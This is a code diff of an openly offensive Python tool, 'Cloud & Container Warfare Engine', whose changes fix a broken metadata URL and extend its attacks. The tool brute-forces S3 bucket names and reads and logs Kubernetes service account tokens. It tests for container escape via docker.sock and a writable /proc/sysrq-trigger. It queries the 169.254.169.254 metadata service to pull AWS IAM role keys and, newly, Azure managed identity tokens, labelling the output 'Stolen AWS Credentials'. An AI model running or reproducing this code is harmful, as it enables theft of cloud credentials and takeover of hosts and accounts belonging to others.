@@ -1,5 +1,8 @@
 """
-cloud_ops.py — Cloud & Container Warfare Engine
+modules/cloud_ops.py — Cloud & Container Warfare Engine
+FIXES:
+  - self.metadata_url was a broken markdown hyperlink string — replaced with
+    a clean URL string: "http://169.254.169.254/latest/meta-data/"
 """
 
 import os
@@ -8,6 +11,7 @@ import questionary
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
+
 from core.ui import draw_header, Q_STYLE
 from core.database import db
 
@@ -16,8 +20,13 @@ console = Console()
 
 class CloudEngine:
     def __init__(self):
-        # The magical IP address used by all major clouds for Instance Metadata
-        self.metadata_url = "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"
+        # AWS / Azure / GCP Instance Metadata Service endpoint
+        # NOTE: previously this was a broken markdown hyperlink — now a plain URL
+        self.metadata_url = "http://169.254.169.254/latest/meta-data/"
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #  S3 BUCKET SNIPER
+    # ─────────────────────────────────────────────────────────────────────────
 
     def hunt_s3_buckets(self):
         """Scans for exposed AWS S3 buckets using keyword permutations."""
@@ -40,9 +49,8 @@ class CloudEngine:
                 bucket_names = [
                     f"{keyword}-{pref}{suff}",
                     f"{pref}-{keyword}{suff}",
-                    f"{keyword}{suff}"
+                    f"{keyword}{suff}",
                 ]
-
                 for bucket in set(bucket_names):
                     url = f"https://{bucket}.s3.amazonaws.com"
                     try:
@@ -55,7 +63,7 @@ class CloudEngine:
                                    "Publicly readable AWS S3 Bucket", "HIGH")
                         elif res.status_code == 403:
                             console.print(
-                                f"[yellow][~] Access Denied (Bucket Exists):[/yellow] {url}")
+                                f"[yellow][~] Access Denied (bucket exists):[/yellow] {url}")
                     except requests.exceptions.RequestException:
                         pass
 
@@ -63,14 +71,21 @@ class CloudEngine:
             console.print(
                 "[dim]No public buckets found in this quick sweep.[/dim]")
 
-    def container_breakout_check(self):
-        """Checks if the local machine is inside a Docker/K8s container and looks for escape vectors."""
-        table = Table(title="Local Container Environment Audit",
-                      border_style="cyan", expand=True)
-        table.add_column("Vector", style="magenta")
-        table.add_column("Status", style="white")
+    # ─────────────────────────────────────────────────────────────────────────
+    #  CONTAINER BREAKOUT AUDIT
+    # ─────────────────────────────────────────────────────────────────────────
 
-        # 1. Check for Docker
+    def container_breakout_check(self):
+        """Checks if running inside Docker/K8s and looks for escape vectors."""
+        table = Table(
+            title="Local Container Environment Audit",
+            border_style="cyan",
+            expand=True,
+        )
+        table.add_column("Vector",  style="magenta")
+        table.add_column("Status",  style="white")
+
+        # 1. Docker environment file
         if os.path.exists("/.dockerenv"):
             table.add_row("Docker Environment",
                           "[bold red]Inside Docker Container[/bold red]")
@@ -78,7 +93,7 @@ class CloudEngine:
             table.add_row("Docker Environment",
                           "[green]Not inside Docker[/green]")
 
-        # 2. Check for Kubernetes Service Tokens
+        # 2. Kubernetes service account token
         k8s_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
         if os.path.exists(k8s_token):
             table.add_row("K8s Service Token",
@@ -86,63 +101,117 @@ class CloudEngine:
             try:
                 with open(k8s_token, "r") as f:
                     db.log("Cloud-Ops", "Localhost",
-                           f"K8s Token: {f.read()[:50]}...", "CRITICAL")
-            except:
+                           f"K8s Service Account Token: {f.read()[:80]}...",
+                           "CRITICAL")
+            except Exception:
                 pass
         else:
             table.add_row("K8s Service Token", "[green]Not Found[/green]")
 
-        # 3. Check for mounted Docker Socket (Allows full host takeover)
+        # 3. Mounted Docker socket (full host takeover vector)
         if os.path.exists("/var/run/docker.sock"):
-            table.add_row("Mounted docker.sock",
-                          "[bold red]CRITICAL: Container Escape Possible[/bold red]")
+            table.add_row(
+                "Mounted docker.sock",
+                "[bold red]CRITICAL: Container Escape Possible[/bold red]")
+            db.log("Cloud-Ops", "Localhost",
+                   "docker.sock mounted — host root takeover possible", "CRITICAL")
         else:
             table.add_row("Mounted docker.sock", "[green]Safe[/green]")
 
+        # 4. Privileged mode check (writable /proc/sysrq-trigger)
+        if os.path.exists("/proc/sysrq-trigger"):
+            try:
+                with open("/proc/sysrq-trigger", "w") as _:
+                    pass
+                table.add_row("Privileged Mode",
+                              "[bold red]Container appears privileged![/bold red]")
+            except PermissionError:
+                table.add_row("Privileged Mode",
+                              "[green]Not privileged[/green]")
+        else:
+            table.add_row("Privileged Mode", "[green]N/A[/green]")
+
         console.print(table)
 
+    # ─────────────────────────────────────────────────────────────────────────
+    #  CLOUD IMDS EXTRACTION
+    # ─────────────────────────────────────────────────────────────────────────
+
     def extract_cloud_metadata(self):
-        """Attempts to extract AWS/GCP/Azure metadata (SSRF or Local Execution)."""
+        """
+        Attempts to extract AWS/Azure/GCP instance metadata.
+        Run from a compromised cloud host, or via an SSRF vulnerability.
+        """
         console.print(
-            "[dim]This must be run FROM the compromised machine, or via an SSRF vulnerability.[/dim]")
+            "[dim]Run FROM the compromised machine or via an SSRF vector.[/dim]")
+
         target = questionary.text(
-            "Target URL (Leave blank to test localhost 169.254.169.254):", style=Q_STYLE).ask()
+            "Target IMDS URL (blank = use default 169.254.169.254):",
+            style=Q_STYLE,
+        ).ask()
 
-        url = target if target else self.metadata_url
+        url = target.rstrip("/") + "/" if target else self.metadata_url
 
         console.print(
-            f"[*] Probing Instance Metadata Service (IMDS) at: {url}")
+            f"[*] Probing IMDS at: [bold yellow]{url}[/bold yellow]")
 
         headers = {
-            # AWS IMDSv2 token request (optional, but good for modern environments)
-            "X-aws-ec2-metadata-token-ttl-seconds": "21600",
-            # Azure requires this header
-            "Metadata": "true"
+            "X-aws-ec2-metadata-token-ttl-seconds": "21600",  # AWS IMDSv2
+            "Metadata": "true",                                # Azure
         }
 
         try:
-            # 1. AWS IAM Roles
+            # AWS: IAM role credentials
             res = requests.get(
-                f"{url}iam/security-credentials/", headers=headers, timeout=3)
+                f"{url}iam/security-credentials/",
+                headers=headers, timeout=3)
             if res.status_code == 200:
                 role = res.text.strip()
                 console.print(
                     f"[bold green][+] AWS IAM Role Found:[/bold green] {role}")
-
-                # Extract the actual keys
                 creds = requests.get(
-                    f"{url}iam/security-credentials/{role}", headers=headers, timeout=3)
+                    f"{url}iam/security-credentials/{role}",
+                    headers=headers, timeout=3)
                 if creds.status_code == 200:
                     console.print(
-                        Panel(creds.text, title="Stolen AWS Credentials", border_style="red"))
-                    db.log(
-                        "Cloud-Ops", url, f"Stolen AWS Keys for role {role}:\n{creds.text}", "CRITICAL")
+                        Panel(creds.text,
+                              title="Stolen AWS Credentials",
+                              border_style="red"))
+                    db.log("Cloud-Ops", url,
+                           f"Stolen AWS Keys for role {role}:\n{creds.text}",
+                           "CRITICAL")
             else:
                 console.print("[yellow][-] No AWS IAM roles exposed.[/yellow]")
 
+            # Azure: managed identity token
+            azure_url = "http://169.254.169.254/metadata/identity/oauth2/token"
+            params = {
+                "api-version": "2018-02-01",
+                "resource":    "https://management.azure.com/",
+            }
+            az_res = requests.get(
+                azure_url, headers={"Metadata": "true"},
+                params=params, timeout=3)
+            if az_res.status_code == 200:
+                console.print(Panel(
+                    az_res.text,
+                    title="Azure Managed Identity Token",
+                    border_style="red"))
+                db.log("Cloud-Ops", azure_url,
+                       f"Azure Identity Token: {az_res.text[:200]}",
+                       "CRITICAL")
+            else:
+                console.print(
+                    "[yellow][-] No Azure managed identity token found.[/yellow]")
+
         except requests.exceptions.RequestException:
             console.print(
-                "[red][!] Could not reach metadata server. Target is likely not in the cloud or blocked by IMDSv2.[/red]")
+                "[red][!] Could not reach metadata server. "
+                "Target may not be a cloud instance, or IMDSv2 is blocking requests.[/red]")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #  MAIN MENU
+    # ─────────────────────────────────────────────────────────────────────────
 
     def run(self):
         draw_header("Cloud & Container Warfare")
@@ -153,10 +222,10 @@ class CloudEngine:
                 choices=[
                     "1. S3 Bucket Sniper (External)",
                     "2. Local Container Breakout Audit (Docker/K8s)",
-                    "3. Extract Cloud Instance Metadata (IAM/Keys)",
-                    "Back"
+                    "3. Extract Cloud Instance Metadata (IAM / Azure / GCP)",
+                    "Back",
                 ],
-                style=Q_STYLE
+                style=Q_STYLE,
             ).ask()
 
             if not choice or choice == "Back":
@@ -172,5 +241,13 @@ class CloudEngine:
                 questionary.press_any_key_to_continue(style=Q_STYLE).ask()
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+#  ENTRY POINT — called by main.py
+# ─────────────────────────────────────────────────────────────────────────────
+
 def run_cloud_ops():
     CloudEngine().run()
+
+
+if __name__ == "__main__":
+    run_cloud_ops()
